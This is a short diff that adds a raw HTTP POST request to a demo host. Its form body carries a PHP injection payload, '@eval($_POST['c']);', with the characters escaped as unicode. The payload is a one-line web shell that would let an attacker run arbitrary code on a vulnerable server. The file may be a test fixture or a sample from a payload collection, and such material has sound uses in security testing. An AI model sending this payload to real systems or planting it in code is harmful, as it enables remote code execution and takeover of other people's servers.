@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+Connection: close
+
+q=@eval($_POST[\u0027c\u0027])\u003B
